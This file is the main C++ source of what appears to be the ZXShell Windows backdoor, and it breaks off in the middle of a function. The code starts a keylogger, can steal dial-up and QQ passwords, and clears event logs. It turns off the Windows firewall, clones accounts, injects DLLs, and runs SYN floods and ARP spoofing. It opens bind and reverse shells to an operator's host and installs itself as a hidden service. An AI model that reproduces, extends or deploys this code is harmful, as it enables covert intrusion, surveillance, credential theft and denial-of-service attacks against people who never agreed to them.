//�Ƿ�������չ����

//#define _AR
//#define _TFTP
//#define _FPORT
//#define _TCPKILL
//#define _LOGINLOG
//#define _Online
//#define _QQLog

//#define _FindPass
//
#define _KEYLOG
#define _ZXARPS
#define _SYNFLOOD
#define _FindDialPass


#define _CA
#define _CleanEvent
#define _CloseFW
#define _Execute
#define _FileTime
#define _GetCMD
#define _LoadDll

#define _PortScan
#define _Ps
#define _RunAs
#define _Service
#define _Shutdown
#define _Sysinfo
#define _TermSvc
#define _TransFile
#define _User
//#define _ZXFTPD
#define _ZXHttpProxy
#define _ZXHttpServer
#define _ZXNC
#define _ZXSockProxy

#define _FILEMANAGE
#define _REMOTEDESKTOP
#define _REMOTEVEDIO
#define _RPORTMAP

/////////////////////////////////////////////////////////

#if defined _ZXS_PRIVATE
#pragma comment(linker, "/base:0x52000000")
#else
#pragma comment(linker, "/base:0x32000000")
#endif

#include "shellmain.h"
#include "..\zxsCommon\zxsWinAPI.h"
#include "common.h"
#include "getopt.h"

#if defined _AR
#include "AR.h"
#endif

#if defined _CleanEvent
#include "CleanEvent.h"
#endif

#include "Execute.h"

#if defined _FindPass
	#include "Findpass.h"
#endif

//#include "ListIP.h"
//#include "Process.h"
#if defined _Ps
#include "ps.h"
#endif

//#if defined _Service
#include "Service.h"
//#endif

//#include "Shell.h"
#include "GetCMD.h"
#include "Shutdown.h"
#include "Sysinfo.h"
#include "TermService.h"

#include "User.h"

//#include "Wget.h"
#include "FileTime.cpp"
#include "RunAs.h"
#include "CloneAccounts.h"
//#include "HandleList.h"
#if (_MSC_VER >= 1300)
namespace FPORT
{
#ifdef _FPORT
#include "portuser_s.cpp"
#endif
}
#endif

#include "..\zxsCommon\SocketList.h"

#if defined _ZXHttpProxy
#include "HttpProxy.cpp"
#endif

#if defined _ZXHttpServer
#include "HttpSvr.cpp"
#endif

#if defined _ZXSockProxy
#include "zxsocks/ZXSocksProxy.cpp"
#endif

#include "Online.h"

namespace FINDDIALPASS
{
#include "ViewDialPass.cpp"
}

#include "Multi_PortScan.cpp"

#if defined _TCPKILL
	#include "tcpkill.cpp"
#endif

#if defined _KEYLOG
	#include "keylog.cpp"
#endif

#if defined _LoadDll
#include "LoadDll.cpp"
#endif

//#if defined _TransFile
#include "Wget.cpp"
//#endif
//#include "GetInteractive.cpp"
//#include "XCMD.cpp"

#include "reg_winfirewall.cpp"

namespace ZXTOOLS
{
//	#include "ZXPortMap.cpp"
#if defined _ZXNC
	#include "ZXNC.cpp"
#endif
#if defined _TFTP
	#include "zxtftp.cpp"
#endif
}

namespace ZXSERVER
{
#if defined _ZXFTPD
#include "ftpd/main.cpp"
#endif
}

//#include "WinVnc.h"
#include "rPortMap.cpp"
#include "TranFile.cpp"
#include "FileManager.h"
#include "FileMG.cpp"

//#include "ModifyCmdLine.cpp"
#include "installsvc.cpp"
#include "GetQQPass.cpp"
#include "ZXPLUG.h"
#include "IamHere.cpp"

//�����ڹ����ļ�������
#include "remotedesktop/rd_server.h"

//��Ƶ����
#include ".\remoteCap\capMain.h"

//synflood
#if defined _SYNFLOOD

#include "ddos.h"

int SYNFlood(MainPara *args);

#endif

#if defined _ZXARPS

#include ".\zxarps\main.h"
#include ".\zxarps\ARPSpoof.h"

#endif

#include ".\SpoofProcPath.h"

//���������ı���
int SetupMode=0; //1==��������
char ServiceName[50] = "iprip";
HANDLE g_hDll = NULL;
SERVICE_STATUS_HANDLE hSrv;
DWORD dwCurrState;
HANDLE RSHandle;
char g_DllPath[MAX_PATH];
char regSvcInfoFile[MAX_PATH];

SOCKET g_BaseSocket;
BOOL Working = TRUE;
char Temp[MAX_BUFF] = {0};
char LocalHostName[128];

//����ÿ����client����������
C_SHELLLIST connlist;
//��������Ķ���
CZXPLUG *zxplug;




#if defined _LOGINLOG
LOGINNED LoginLog;
#endif


//int ZXSHELL_Port = 777;
//char Shell_Welcome[MAX_PATH]   = "\r\n\r\n" ;

int ReverseShell(MainPara *args);
BOOL ReverseShell(bool client, char *szIP, WORD wPort);

bool ReadShellCfgInfo();
void createMainThread(void *pAddr, void *lParam);
DWORD WINAPI ShellMainThread(LPVOID lParam);

//////////////////////////////////////////////////////////////////////


void err_display(SOCKET Socket, char *msg, bool sendimmediately)
{
	if(Socket == ~0)
		return;
	LPVOID lpMsgBuf;
	FormatMessage( 
		FORMAT_MESSAGE_ALLOCATE_BUFFER|
		FORMAT_MESSAGE_FROM_SYSTEM,
		NULL, WSAGetLastError(),
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf, 0, NULL);
	int n = sprintf(Temp, "[%s] %s\r\n", msg, (LPCTSTR)lpMsgBuf);
	if(sendimmediately)
		SendMessage(Socket, Temp);
	LocalFree(lpMsgBuf);
}

void ShellHelp_cn(SOCKET Socket)
{
	SPAMFUNCTION

	SendMessage(Socket,
"\"==>\" ���ű�ʾ��ָ����һ����������.\r\n"
"    ������������Ը�������������Ϣ.\r\n"
"�����б�:\r\n\r\n"

#if defined _AR
"AR                        -->�ָ�ϵͳ���õ��ļ�����\r\n"
#endif

#if defined _CA
"CA                        ==>��¡ϵͳ�˺�\r\n"
#endif

#if defined _CleanEvent
"CleanEvent                -->���ϵͳ�ռ�\r\n"
#endif

#if defined _CloseFW
"CloseFW                   -->��ʱ�ر�windows�Դ�����ǽ\r\n"
#endif

//"Dnload                    ==>��Զ�̼���������ļ�\r\n"
"End                       -->����������\r\n"

#if defined _Execute
"Execute                   ==>����һ������\r\n"
#endif

#if defined _FileTime
"FileTime                  ==>��¡һ���ļ���ʱ����Ϣ\r\n"
#endif

#if defined _FindPass
"FindPass                  -->���ҵ�½�˺ŵ�����(ֻ�ʺ�2000ϵͳ)\r\n"
#endif

#if defined _FindDialPass
"FindDialPass              -->�г����в��ŵ��˺ź�����\r\n"
#endif

#if (_MSC_VER >= 1300)
#if defined _FPORT
"FPort                     -->���̵��˿ڵ�ӳ���б�\r\n"
#endif
#endif

//"GetCMD                    -->���һ��cmd.exe\r\n"
"Help | ?                  -->��ʾ����Ϣ\r\n"

#if defined _KEYLOG
"KeyLog                    ==>��׽���¼Զ�̼�����İ�����Ϣ\r\n"
#endif

//"ListIP                    -->�г�����������IP\r\n"

#if defined _LoadDll
"LoadDll                   ==>����һ��DLL����뵽ָ���Ľ���\r\n"
#endif

#if defined _Online
"Online                    ==>�г���½�ڱ�Shell������IP\r\n"
#endif

//"QQLog                     ==>QQ�����¼\r\n"
#if defined _PortScan
"PortScan                  ==>�˿�ɨ��\r\n"
#endif

#if defined _Ps
"Ps                        ==>���̹���\r\n"	
#endif

#if defined _RunAs
"RunAs                     ==>���������̻��û����������г���\r\n"
#endif

#if defined _Service
"SC                        ==>�������\r\n"
#endif

#if defined _SHELLLOG
"ShellLog                  -->��Shell�����Ӽ�¼.\r\n"
#endif

"ShareShell                ==>����һ��Shell������.\r\n"

#if defined _Shutdown
"ShutDown                  ==>ע�� || ���� || �ر� ϵͳ\r\n"
#endif

#if defined _Sysinfo
"Sysinfo                   -->�鿴ϵͳ��ϸ��Ϣ\r\n"	
#endif

#if defined _SYNFLOOD
"SYNFlood                  -->SYN ����\r\n"	
#endif

#if defined _TCPKILL
"TcpKill                   ==>�ر�һ���Խ�����TCP ����\r\n"
#endif

#if defined _TermSvc
"TermSvc                   ==>�����ն˷���  \r\n"
#endif

#if defined _TFTP
"TFtp                      ==>TFTP �ͻ���\r\n"
#endif

#if defined _TransFile
"TransFile                 ==>��ָ����ַ�����ļ����ϴ��ļ���ָ��FTP������\r\n"
#endif

"Uninstall                 -->жװ\r\n"
//"Upload                    ==>�ϴ��ļ���Զ�̼����\r\n"

#if defined _User
"User                      ==>ϵͳ�ʻ�����\r\n"
#endif

#if defined _ZXARPS
"ZXARPS                    ==>ZXARPS\r\n"
#endif

#if defined _ZXNC
"ZXNC                      ==>NC\r\n"
#endif

#if defined _ZXFTPD
"ZXFtpServer               ==>FTP ������\r\n"
#endif

#if defined _ZXHttpProxy
"ZXHttpProxy               ==>HTTP ����������\r\n"
#endif

#if defined _ZXHttpServer
"ZXHttpServer              ==>HTTP ������\r\n"
#endif

"ZXPlug                    ==>�������, �������Զ�������\r\n"
#if defined _ZXSockProxy
"ZXSockProxy               ==>Socks 4 & 5 ����\r\n"
#endif

"\r\n");

	if(zxplug->GetPlugCount(true) > 0)
	{
		zxplug->GetPlugList(Socket);
	}
    SendMessage(Socket,"����ɹ����.\r\n");

    return ;
}


typedef DWORD (WINAPI *LPZXSERVER_MAIN_ENTRY)(MainPara *args);

DWORD ZXServer(LPZXSERVER_MAIN_ENTRY lpMainEntry, MainPara *args)
{
	SPAMFUNCTION 

	DWORD dwID;
	MainPara *mainargs = new MainPara;
	if(mainargs == NULL)
		return 0;
	*mainargs = *args;
	HANDLE hThread = ZXSAPI::CreateThread(NULL,0, (LPTHREAD_START_ROUTINE)lpMainEntry,(LPVOID)mainargs,0, &dwID);
	if(hThread)
	{
		WaitForSingleObject(hThread, 1000);
		CloseHandle(hThread);
	}
	//Sleep(500);
	return 1;
}

SOCKET doAction_Connect(SOCKET Socket, int action)
{
	SPAMFUNCTION 
		
	int nRetVal;
	char Buf[sizeof(MASTER)];
	memset(Buf, 0, sizeof(Buf));
	MASTER *pMaster = (MASTER *)Buf;

	char szIP[32];
	WORD Port;

	SOCKET actionSocket;
	SOCKADDR_IN clientaddr;
	int addrlen = sizeof(clientaddr);
	//ȡ����controller��socket��Ϣ
	if(getpeername(Socket, (SOCKADDR *)&clientaddr, &addrlen) == SOCKET_ERROR)
		return FALSE;

	sprintf(szIP, "%s", inet_ntoa(clientaddr.sin_addr));
	Port = ntohs(clientaddr.sin_port);

	actionSocket = ieConnectHost(szIP, Port);
	if(actionSocket == 0)
		return FALSE;

	_tagSHELL *baseConn = connlist.IsSocketInList(Socket);

	if(!baseConn)
		return FALSE;

	//�ͻ������ߵ�����������shareshell��õģ���ô����ִ��ָ���Ҫ������֤��
	//GetAuthMode ��ø�ֵ�����
	if(!IsThatMyMaster(Socket, actionSocket, action, baseConn->GetAuthMode()))
		return FALSE;

	return actionSocket;
}

void doAction_CreateThread(void *pFunc, void *arg)
{
	SPAMFUNCTION 
		
	DWORD dwID;
	HANDLE hThread = ZXSAPI::CreateThread(0,0,
		(LPTHREAD_START_ROUTINE)pFunc, (LPVOID)arg, 0, &dwID);
	if(hThread)
		CloseHandle(hThread);
}

BOOL DoAction(SOCKET Socket, int action)
{
	SPAMFUNCTION 

	SOCKET actionSocket = doAction_Connect(Socket, action);
	if(!actionSocket)
	{
		SendMessage(Socket, "ִ��ָ��ʧ�� :(\r\n");
		return FALSE;
	}
	TurnOnKeepAlive(actionSocket, 30*1000, 5000);

	HANDLE hThread;


#if defined _FILEMANAGE
	if(action == action_FileMG)
	{
		doAction_CreateThread(FileMG1, (void*)actionSocket);
	}else
#endif

#if defined _REMOTEDESKTOP
//	if(action == action_WinVNC)
//	{
//		doAction_CreateThread(autoVNC, (void*)actionSocket);
//	}else
	if(action == action_RDSRV)
	{
		doAction_CreateThread(RDServer, (void*)actionSocket);
	}else
#endif

#if defined _RPORTMAP
	if(action == action_PORTMAP)
	{
		doAction_CreateThread(rPortMap, (void*)actionSocket);
	}else 
#endif
		
#if defined _REMOTEVEDIO
	if(action == action_CAPSRV)
	{
		doAction_CreateThread(CAPMAIN::capServer, (void*)actionSocket);
	}
#endif


	return TRUE;
}

BOOL ExeCommand(SOCKET Socket,char *Command)
{
#ifdef _AntiBadFirewall
	AntiBadFirewall antibadfw;
#endif

	SPAMFUNCTION 
		
	BOOL bError = TRUE;

	char argv_0[MAX_PATH] = {0};
	sscanf(Command, "%s", argv_0);
	MainPara args;
	args.Socket = Socket;
	args.lpCmd = Command;
	if(!stricmp(argv_0, ""))
		return	SendMessage(Socket, "%s>", LocalHostName);
#if defined _AR
	else if(!stricmp(argv_0,"AR"))
		AR(Socket);
#endif
	else if(!stricmp(argv_0,"Help") || !stricmp(argv_0,"?"))
		ShellHelp_cn(Socket);
	else if(!stricmp(argv_0,"Exit") || !stricmp(argv_0,"Quit"))
		return FALSE;

#if defined _Sysinfo
	else if(!stricmp(argv_0,"Sysinfo"))
		Sysinfo(Socket);
#endif

#if defined _SYNFLOOD
	else if(!stricmp(argv_0,"SYNFlood"))
		SYNFlood(&args);
#endif

#if defined _Ps
	else if(!stricmp(argv_0,"Ps"))
		Process(&args);
#endif

#if defined _CleanEvent
	else if(!stricmp(argv_0,"CleanEvent"))
		CleanEvent(Socket);
#endif

#if defined _FindPass
	else if(!stricmp(argv_0,"FindPass"))
		FindPass(Socket);
#endif

#if defined _FileTime
	else if(!stricmp(argv_0,"FileTime"))
		FileTime(&args);
#endif

#if defined _FindDialPass
	else if(!stricmp(argv_0,"FindDialPass"))
		FINDDIALPASS::FindDialPass(Socket);
#endif

#if (_MSC_VER >= 1300)
#if defined _FPORT
	else if(!stricmp(argv_0,"FPort"))
		FPORT::main(Socket);
#endif
#endif

#if defined _User
	else if(!stricmp(argv_0,"User"))
		User(&args);
#endif

#if defined _TransFile
	else if(!stricmp(argv_0,"TransFile"))
		WGET(&args);
#endif

#if defined _Execute
	else if(!stricmp(argv_0,"Execute"))
		Execute(&args);
#endif

#if defined _Service
	else if(!stricmp(argv_0,"SC"))
		ServiceController(&args);
#endif

#if defined _CA
	else if(!stricmp(argv_0,"CA"))
		CloneAccounts(&args);
#endif

#if defined _RunAs
	else if(!stricmp(argv_0,"RunAs"))
		RunAs(&args);
#endif

#if defined _TermSvc
	else if(!stricmp(argv_0,"TermSvc"))
		TermSvc(&args);
#endif

#if defined _GetCMD
	else if(!stricmp(argv_0,"GetCMD"))
		GetCMD(&args);
#endif

#if defined _Shutdown
	else if(!stricmp(argv_0,"Shutdown"))
		Shutdown(&args);
#endif

#if defined _ZXARPS
	else if(!stricmp(argv_0,"ZXARPS"))
		ZXARPS(&args);
#endif

#if defined _ZXNC
	else if(!stricmp(argv_0,"ZXNC"))
		ZXTOOLS::ZXNC(&args);
#endif

#if defined _ZXHttpProxy
	else if(!stricmp(argv_0, "ZXHttpProxy"))
		ZXServer(ZXHttpProxy, &args);
#endif

#if defined _ZXSockProxy
	else if(!stricmp(argv_0, "ZXSockProxy"))
		ZXServer(ZXSockProxy, &args);
#endif

#if defined _ZXHttpServer
	else if(!stricmp(argv_0, "ZXHttpServer"))
		ZXServer(ZXHttpServer, &args);
#endif

#if defined _ZXFTPD
	else if(!stricmp(argv_0, "ZXFtpServer"))
		ZXServer(ZXSERVER::ZXFtpServer, &args);
#endif

#if defined _PortScan
	else if(!stricmp(argv_0,"PortScan"))
		PortScan(&args);
#endif

#if defined _TFTP
	else if(!stricmp(argv_0,"TFtp"))
		ZXTOOLS::ZXTFtp(&args);
#endif

#if defined _TCPKILL
	else if(!stricmp(argv_0,"TcpKill"))
		TcpKill(&args);
#endif

#if defined _KEYLOG
	else if(!stricmp(argv_0,"KeyLog"))
		KeyLog(&args);
#endif

#if defined _LoadDll
	else if(!stricmp(argv_0,"LoadDll"))
		LoadDll(&args);
#endif

#if defined _Online
	else if(!stricmp(argv_0,"Online"))
		Online(&args);
#endif

#if defined _LOGINLOG
	else if(!stricmp(argv_0,"ShellLog"))
		LoginLog.ListRecord(Socket);
#endif
	else if(!stricmp(argv_0,"End"))
	{
		Working = bError = FALSE;
	}
	else if(!stricmp(argv_0,"UnInstall"))
	{
		if(UnInstall())
		{
			bError = FALSE;
			SendMessage(Socket,"UnInstall successfully.\r\n");
		}
		else
		{
			SendMessage(Socket,"Failed To UnInstall .\r\n");
		}
	}
	else if(!stricmp(argv_0,"ShareShell"))
		ReverseShell(&args);

#if defined _CloseFW
	else if(!stricmp(argv_0,"CloseFW"))
		CloseFW(Socket);
#endif

#if defined _QQLog
	else if(!stricmp(argv_0,"QQLog"))
		GetQQPswLog(&args);
#endif

#if defined _FILEMANAGE
	else if(!stricmp(argv_0,"FileMG"))
		DoAction(Socket, action_FileMG);
#endif

#if defined _REMOTEDESKTOP
	else if(!stricmp(argv_0,"winvnc")){
		DoAction(Socket, action_RDSRV);
	}
//	else if(!stricmp(argv_0,"realvnc")){
//		if(GetVNCDllEntry(Socket))
//			DoAction(Socket, action_WinVNC);
//	}
#endif

#if defined _RPORTMAP
	else if(!stricmp(argv_0,"rPortMap")){
		DoAction(Socket, action_PORTMAP);
	}
#endif

#if defined _REMOTEVEDIO
	else if(!stricmp(argv_0,"capsrv")){
		DoAction(Socket, action_CAPSRV);
	}
#endif


	else if(!stricmp(argv_0,"zxplug"))
		zxplug->zxplug(&args);
	else if(zxplug->IsPlugCMD(argv_0))
		zxplug->cmd(&args);
	else
		SendMessage(Socket,"'%s' Unknown Command.\r\n", argv_0);

	SendMessage(Socket, "%s>", LocalHostName);
	return bError;

}

BOOL Shell(SOCKET Socket)
{
	SPAMFUNCTION 

	BOOL bError = TRUE;
	BOOL bFWState;
	char RecvBuf[MAX_CMD_LEN+4];

	gethostname(LocalHostName, 128);

/*
	char   *MSG_Login       = "SesameOpen: " ;
	char   *LoginPsw        = "520";

	DataSend(Socket, MSG_Login, lstrlen(MSG_Login));
	if(! GetCMD(Socket, RecvBuf, 10))
		goto exit;

	if(strcmp(RecvBuf, LoginPsw))
	{
		LoginLog.AddRecord(Socket, FALSE);
		goto exit;
	}else
*/	{
#if defined _LOGINLOG
		LoginLog.AddRecord(Socket, TRUE);//��¼���е�½�ߵ���Ϣ
#endif
	}

	bFWState = GetWinFirewallState();

	//ChangeServiceDesktop(NULL);
	//
#if defined _Online
	ShellOnline.AddSocket(Socket);//���ӳɹ���½�ߵ���������
#endif

	SendMessage(Socket, "\r\n%s>\r\n", LocalHostName);
/*
	if(qqlog.size()>0)
	{
		SendMessage(Socket, "���� %d ��QQ�����¼, ��ע�����.\r\n", qqlog.size());
	}


#if defined _KEYLOG
	if(g_KeyLogList.GetCount()>0)
	{
		SendMessage(Socket, "���� %d �����̼�¼, ��ע�����.\r\n", g_KeyLogList.GetCount());
	}
#endif
*/

	//To prevent the system from displaying some error message box, 
	//such as access A: and there is no floppy disk inserted.
	SetErrorMode(SEM_FAILCRITICALERRORS);

	TurnOnKeepAlive(Socket, 30*1000, 7000);
	while(1)
	{
		if(! GetCmdLine(Socket, RecvBuf, sizeof(RecvBuf), -1))
			break;

		if(! ExeCommand(Socket, RecvBuf))
			break;
	}
#if defined _DEBUG
	printf("disconnected.\r\n");
#endif
#if defined _Online
	ShellOnline.DelSocket(Socket);
#endif
	connlist.DelSocket(Socket);

	if(GetWinFirewallState() != bFWState)
		TurnWinFirewall(bFWState);

exit:
	shutdown(Socket, SD_BOTH);
	//closesocket(Socket);
	ForceCloseSocket(Socket);

	return bError;
}

SOCKET BindShell(DWORD dwIP, WORD wPort)//��dwIP�ϰ�wPort�˿�
{
	SOCKET sockid;
	int nLevel = 1;
	if ((sockid = ZXSAPI::socket(PF_INET, SOCK_STREAM,IPPROTO_TCP)) == INVALID_SOCKET)
		return 0;
	struct sockaddr_in srv_addr = {0};
	srv_addr.sin_family = AF_INET;
	srv_addr.sin_addr.S_un.S_addr = dwIP;
	srv_addr.sin_port = htons(wPort);

    if (setsockopt(sockid, SOL_SOCKET, SO_REUSEADDR,
        (const char FAR *)&nLevel, sizeof(nLevel)) != 0) {
        goto error;
    }
	if (ZXSAPI::bind(sockid,(struct sockaddr*)&srv_addr,sizeof(struct sockaddr_in)) == SOCKET_ERROR)
		goto error;
	if (ZXSAPI::listen(sockid,3) == SOCKET_ERROR)
		goto error;
	return sockid;
error:
	closesocket(sockid);
	return 0;
}

int ReverseShell(MainPara *args)
{
	SPAMFUNCTION 
		
	SOCKET Socket = args->Socket;

	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();

	char *Usage = ""
		"Usage:\r\n"
		"     ShareShell IP Port -nc\r\n"
		"Example:\r\n"
		"     ShareShell 1.1.1.1 99 -nc (�ͻ�����nc)\r\n"
		"     ShareShell 1.1.1.1 99 (�ͻ�����controller)\r\n";
	if(argc < 3)
		return SendMessage(Socket, Usage);

	bool client = true;

	if(argc >=4)
	{
		if(!stricmp(argv[3], "-nc"))
			client = false;
	}

	if(ReverseShell(client, argv[1], atoi(argv[2])))
		SendMessage(Socket, "Shared a shell to %s:%s Successfully.\r\n", argv[1], argv[2]);
	else
		SendMessage(Socket, "Connect To %s:%s Error.\r\n", argv[1], argv[2]);

	return 0;
}

BOOL ReverseShell(bool client, char *szIP, WORD wPort)
{
	SPAMFUNCTION 
		
	char szBuf[MAX_PATH];
	SOCKET server = ieConnectHost(szIP, wPort);

	if(server <= 0)
		return FALSE;

	if(client)
	{
		if(! GetSomeInfo(szBuf))
		{			
			ForceCloseSocket(server);
			return FALSE;
		}

		if(! IsThatMyMaster(0, server, action_Online, false))
		{
			ForceCloseSocket(server);
			return FALSE;
		}

		DataSend(server, szBuf, strlen(szBuf));
		Recv_ACK(server, 0xF4); //���õ�ȷ�ϰ�

	}

	DWORD dwID;
	HANDLE hThread = ZXSAPI::CreateThread(0,0,
		(LPTHREAD_START_ROUTINE)Shell, (LPVOID)server, 0, &dwID);
	if(hThread)
		CloseHandle(hThread);
	return TRUE;
}

int BindShell()
{
	HANDLE hThread;
	DWORD dwThreadId;
	SOCKET AcceptSocket;

	TurnWinFirewall(OFF);

	g_BaseSocket = BindShell(INADDR_ANY, ReusePort);
	if(g_BaseSocket <= 0)
		goto error;


	while(1)
	{
		AcceptSocket = DoAccept(g_BaseSocket, -1);
		if(AcceptSocket == 0)
			break;
		if(AcceptSocket == INVALID_SOCKET)
		{
			Sleep(1000);
			continue;
		}

		hThread = ZXSAPI::CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Shell, (LPVOID)AcceptSocket, NULL, &dwThreadId);
		if(hThread)
			CloseHandle(hThread);
		else
			Sleep(1000);

	}

	TurnWinFirewall(ON);

error:
	__printf("Error.\r\n");
	closesocket(g_BaseSocket);
	g_BaseSocket = 0;
	return false;
}

BOOL InsInit()
{
	SPAMFUNCTION 
		
	// Create the named mutex
	SECURITY_ATTRIBUTES sa;
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	HANDLE mutex = ZXSAPI::CreateMutex(&sa, FALSE, ZXMUTEX);
	if (mutex == NULL)
		return FALSE;

	// Check that the mutex didn't already exist
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		CloseHandle(mutex);
		return FALSE;
	}
	return TRUE;
}


DWORD WINAPI ShellMainThread(LPVOID lParam)
{
	SPAMFUNCTION 
		

	__printf("ShellMainThread Entry\r\n");
	//__asm INT 3

	if(SetupMode == 1)
	{
		createthread_SaveMyService();
	}

	if(lParam)
	{
		ZXSAPI::VirtualFree(lParam, 0, MEM_DECOMMIT);
		//HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, lParam);
	}
	if(g_hDll == NULL)
		ZXSAPI::GetModuleFileName(HMODULE(g_hDll), g_DllPath, sizeof(g_DllPath));

#if !defined _DEBUG
	if(!ReadShellCfgInfo())
		return 0;
#endif

	LockMyFile();

#if defined _ZXS_PRIVATE
	InsInit();
#endif

	WSADATA WSAData;
	if(WSAStartup(MAKEWORD(2,2), &WSAData))
		return 0;

	zxplug = new CZXPLUG;

	zxplug->init();


#if defined _KEYLOG
	StartKeyLogger(0);//�������̼�¼���ɼ�¼WINDOWS��½����
#endif

#if defined _QQLog
	StartQQLogger();//����QQ�����¼��
#endif

	__printf("CreateThread: IamHere\r\n");


#if defined _DEBUG
	//���԰汾��������Щ�߳�
	DWORD dwID;
	HANDLE hThread;

	for(int i=0; i<1; i++)
	{
		hThread = ZXSAPI::CreateThread(0,0,
			(LPTHREAD_START_ROUTINE)IamHere, 0, 0, &dwID);
	}
	WaitForSingleObject(hThread, -1);
	CloseHandle(hThread);
#else
	IamHere(0);
#endif

	WSACleanup();
	return 0;
}

int main(int argc, char **argv)
{
	BOOL ret;

#if defined _ZXS_PRIVATE
	ret = ZXSAPI::InitZXGetProcAddrFunc();
	ret = ZXSAPI::InitZXShellSubtleAPI();
#endif


	//printf("%d\n", GetCurrentProcessId());
	//getchar();
	WSADATA WSAData;
	if(WSAStartup(MAKEWORD(2,2), &WSAData))
		return 0;

	for(int i=1; i<argc; i++)
	{
		if(argv[i][0] == '-')
		{
			if(!stricmp(argv[i]+1, "install"))
			{
				Install();
				return 1;
			}else if(!stricmp(argv[i]+1, "uninstall"))
			{
				UnInstall();
				return 1;
			}else if(!stricmp(argv[i]+1, "ip"))
			{
				strcpy(MySite, argv[i+1]);
				xorflag = true;
			}else if(!stricmp(argv[i]+1, "port"))
			{
				MywPort = atoi(argv[i+1]);
			}
		} 

	}
/*
	if(strstr(strlwr(argv[0]), "utilman"))
	{
		strcpy(MySite, "192.168.1.5");
		xorflag = true;
	}
*/

	return ShellMainThread(0);
}
//dll entry

#pragma pack(push, 1)
struct _CFG
{
	DWORD flag;
	char IP[100];
	int Port;
	DWORD passwdcrc32;
};
#pragma pack(pop)

bool ReadShellCfgInfo()
{
	SPAMFUNCTION 
		
	//char szBuffer[MAX_PATH];
	DWORD filesize, bytesRead;

	//ZXSAPI::GetModuleFileName((HMODULE)g_hDll, szBuffer, sizeof(szBuffer));

	HANDLE hFile = ZXSAPI::CreateFile(g_DllPath,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if(hFile == INVALID_HANDLE_VALUE){
		return false;
	}
	__try
	{
		_CFG cfg;
		filesize = GetFileSize(hFile, NULL);
		SetFilePointer(hFile, filesize-sizeof(_CFG), NULL, FILE_BEGIN);
		if(!ZXSAPI::ReadFile(hFile, &cfg, sizeof(_CFG), &bytesRead, NULL) || bytesRead!=sizeof(_CFG))
			return false;

		if(cfg.flag != 5201314)
			return false;
		memcpy(MySite, cfg.IP, 100);
		MywPort = cfg.Port;
		PasswdCRC32 = cfg.passwdcrc32;

		return true;
	}__finally
	{
		CloseHandle(hFile);
	}
	return true;
}


BOOL APIENTRY DllMain( HANDLE hModule, 
					  DWORD  ul_reason_for_call, 
					  LPVOID lpReserved
					  )
{
	SPAMFUNCTION 
		
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		//__asm INT 3
		__printf("DllMain Entry\r\n");

		g_hDll = hModule;

#if defined _ZXS_PRIVATE
		__printf("InitZXGetProcAddrFunc entry\r\n");
		if(!ZXSAPI::InitZXGetProcAddrFunc())
		{
			__printf("InitZXGetProcAddrFunc error\r\n");
			return 0;
		}
		__printf("InitZXShellSubtleAPI entry\r\n");
		if(!ZXSAPI::InitZXShellSubtleAPI())
		{
			__printf("InitZXShellSubtleAPI error\r\n");
			return 0;
		}



#endif

		GetModuleFileName((HMODULE)hModule, g_DllPath, sizeof(g_DllPath));

		__printf("DllMain init ok\r\n");
		//createMainThread(ShellMainThread, 0);
		break;

    }

    return TRUE;
}


int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
{
	SPAMFUNCTION 
		
    SERVICE_STATUS srvStatus;
    srvStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    srvStatus.dwCurrentState = dwCurrState = dwState;
    srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;
    srvStatus.dwWin32ExitCode = dwExitCode;
    srvStatus.dwServiceSpecificExitCode = 0;
    srvStatus.dwCheckPoint = dwProgress;
    srvStatus.dwWaitHint = 10000;
    return SetServiceStatus( hSrv, &srvStatus );
}

void __stdcall ServiceHandler( DWORD dwCommand )
{
	SPAMFUNCTION 
		
    switch( dwCommand )
    {
    case SERVICE_CONTROL_STOP:
        TellSCM( SERVICE_STOP_PENDING, 0, 1 );
		Sleep(10);
        TellSCM( SERVICE_STOPPED, 0, 0 );
        break;
    case SERVICE_CONTROL_PAUSE:
        TellSCM( SERVICE_PAUSE_PENDING, 0, 1 );
        TellSCM( SERVICE_PAUSED, 0, 0 );
        break;
    case SERVICE_CONTROL_CONTINUE:
        TellSCM( SERVICE_CONTINUE_PENDING, 0, 1 );
        TellSCM( SERVICE_RUNNING, 0, 0 );
        break;
    case SERVICE_CONTROL_INTERROGATE:
        TellSCM( dwCurrState, 0, 0 );
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        TellSCM( SERVICE_STOPPED, 0, 0 );
		break;
    }

}

void LockMyFile()
{
	SPAMFUNCTION 
		
	ZXSAPI::CreateFile(g_DllPath, 
		GENERIC_READ, 
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
}

BOOL incLibraryCount(HMODULE ownInstance)
{
	SPAMFUNCTION 
		
	//FreeLibrary��ܶ�ϵͳdllҲ��free�������Խ������Ѽ��ص���loadһ�������Ӽ���
    
	HANDLE hModsSnap =  ZXSAPI::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0);

    if(INVALID_HANDLE_VALUE == hModsSnap)
    {
        return FALSE;
    }

    MODULEENTRY32 meModuleEntry;
    meModuleEntry.dwSize = sizeof(MODULEENTRY32);

    if(!Module32First(hModsSnap, &meModuleEntry))
    {
        CloseHandle(hModsSnap);
        return FALSE;
    }
    do
    {
     
		if(ZXSAPI::LoadLibrary(meModuleEntry.szModule) == (HMODULE)ownInstance)
			FreeLibrary((HMODULE)g_hDll);

    } while(Module32Next(hModsSnap, &meModuleEntry));

    CloseHandle(hModsSnap);

	return TRUE;
}


void createMainThread(void *pAddr, void *lParam)
{
	SPAMFUNCTION 
		

	DWORD dwID;
